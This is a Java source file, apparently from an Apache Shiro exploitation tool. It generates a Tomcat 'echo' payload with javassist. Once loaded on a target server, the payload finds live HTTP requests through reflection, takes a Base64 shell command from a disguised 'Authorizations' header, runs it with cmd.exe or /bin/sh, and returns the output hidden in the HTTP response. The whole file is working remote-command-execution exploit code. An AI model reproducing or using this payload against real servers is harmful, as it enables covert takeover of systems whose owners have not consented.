package com.sma11new.exp.shiro.attack.echo;

import com.sma11new.exp.shiro.ShiroAttack;
import javassist.*;

import java.io.IOException;

public class TomcatEcho
implements EchoPayload {
    @Override
    public CtClass genPayload(ClassPool pool) throws CannotCompileException, NotFoundException, IOException {
        CtClass clazz;

        if (ShiroAttack.isPost && ShiroAttack.enableCustomLoader) {
            clazz = pool.makeClass(ClassLoader.className);
        } else {
            clazz = pool.makeClass("com.sma11new.exp.shiro.payload.build.Test" + System.nanoTime());
        }

        if (clazz.getDeclaredConstructors().length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addMethod(CtMethod.make("    private static void writeBody(Object var0, byte[] var1) throws Exception {\n        byte[] bs = (\"BrY3jhHrh6\" + org.apache.shiro.codec.Base64.encodeToString(var1) + \"yQqlMgS1cL\").getBytes();\n        Object var2;\n        Class var3;\n        try {\n            var3 = Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\");\n            var2 = var3.newInstance();\n            var3.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(var2, new Object[]{bs, new Integer(0), new Integer(bs.length)});\n            var0.getClass().getMethod(\"doWrite\", new Class[]{var3}).invoke(var0, new Object[]{var2});\n        } catch (Exception var5) {\n            var3 = Class.forName(\"java.nio.ByteBuffer\");\n            var2 = var3.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(var3, new Object[]{bs});\n            var0.getClass().getMethod(\"doWrite\", new Class[]{var3}).invoke(var0, new Object[]{var2});\n        } \n    }", clazz));
        clazz.addMethod(CtMethod.make("    private static Object getFV(Object var0, String var1) throws Exception {\n        java.lang.reflect.Field var2 = null;\n        Class var3 = var0.getClass();\n\n        while(var3 != Object.class) {\n            try {\n                var2 = var3.getDeclaredField(var1);\n                break;\n            } catch (NoSuchFieldException var5) {\n                var3 = var3.getSuperclass();\n            }\n        }\n\n        if (var2 == null) {\n            throw new NoSuchFieldException(var1);\n        } else {\n            var2.setAccessible(true);\n            return var2.get(var0);\n        }\n    }", clazz));
        clazz.addConstructor(CtNewConstructor.make("public TomcatEcho() throws Exception {\n        boolean var4 = false;\n        Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\");\n\n        for (int var6 = 0; var6 < var5.length; ++var6) {\n            Thread var7 = var5[var6];\n            if (var7 != null) {\n                String var3 = var7.getName();\n                if (!var3.contains(\"exec\") && var3.contains(\"http\")) {\n                    Object var1 = getFV(var7, \"target\");\n                    if (var1 instanceof Runnable) {\n                        try {\n                            var1 = getFV(getFV(getFV(var1, \"this$0\"), \"handler\"), \"global\");\n                        } catch (Exception var13) {\n                            continue;\n                        }\n\n                        java.util.List var9 = (java.util.List) getFV(var1, \"processors\");\n\n                        for(int var10 = 0; var10 < var9.size(); ++var10) {\n                            Object var11 = var9.get(var10);\n                            var1 = getFV(var11, \"req\");\n                            Object var2 = var1.getClass().getMethod(\"getResponse\",new Class[0]).invoke(var1, new Object[0]);\n                            var3 = (String)var1.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(var1, new Object[]{new String(\"Host\")});\n                            if (var3 != null && !var3.isEmpty()) {\n                                var2.getClass().getMethod(\"setStatus\", new Class[]{Integer.TYPE}).invoke(var2, new Object[]{new Integer(200)});\n                                var2.getClass().getMethod(\"addHeader\", new Class[]{String.class, String.class}).invoke(var2, new Object[]{new String(\"Host\"), var3});\n                                var4 = true;\n                            }\n\n                            var3 = (String)var1.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(var1, new Object[]{new String(\"Authorizations\")});\n                            if (var3 != null && !var3.isEmpty()) {\n                                var3 = org.apache.shiro.codec.Base64.decodeToString(var3.replaceAll(\"Basic \", \"\"));\n                                String[] var12 = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", var3} : new String[]{\"/bin/sh\", \"-c\", var3};\n                                writeBody(var2, (new java.util.Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter(\"\\\\A\").next().getBytes());\n                                var4 = true;\n                            }\n\n                            if (var4) {\n                                break;\n                            }\n                        }\n\n                        if (var4) {\n                            break;\n                        }\n                    }\n                }\n            }\n        }\n    }", clazz));
        System.out.println(clazz);
        return clazz;
    }
}

